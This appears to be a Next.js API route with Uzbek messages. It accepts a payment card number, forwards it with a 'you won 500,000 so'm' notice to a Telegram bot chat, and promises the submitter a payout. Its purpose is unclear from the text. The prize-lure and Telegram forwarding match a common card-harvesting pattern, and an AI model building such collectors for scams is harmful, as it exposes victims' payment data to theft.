import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { cardNumber } = body;

    if (!cardNumber || typeof cardNumber !== 'string') {
      return NextResponse.json(
        { success: false, message: 'Karta raqami kiritilmadi' },
        { status: 400 }
      );
    }

    const cleanCardNumber = cardNumber.replace(/\s/g, '');
    if (cleanCardNumber.length !== 16) {
      return NextResponse.json(
        { success: false, message: 'Karta raqami 16 ta raqamdan iborat bo\'lishi kerak' },
        { status: 400 }
      );
    }

    const formattedCard = cleanCardNumber.replace(/(\d{4})(?=\d)/g, '$1 ');

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    const messageText = `🎉 Ruxshona saytda 500,000 so'm yutdi!\n💳 Karta: ${formattedCard}`;

    if (token && chatId) {
      const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: messageText,
          parse_mode: 'HTML',
        }),
      });

      if (!response.ok) {
        console.error('Telegram API error:', await response.text());
      }
    } else {
      console.log(' Telegram notification simulation:', messageText);
    }

    return NextResponse.json({
      success: true,
      message: "Yutuq so'rovi qabul qilindi! Pul tez orada kartangizga o'tkaziladi ✨",
    });
  } catch (error) {
    console.error('API Error:', error);
    return NextResponse.json(
      { success: false, message: 'Serverda xatolik yuz berdi' },
      { status: 500 }
    );
  }
}
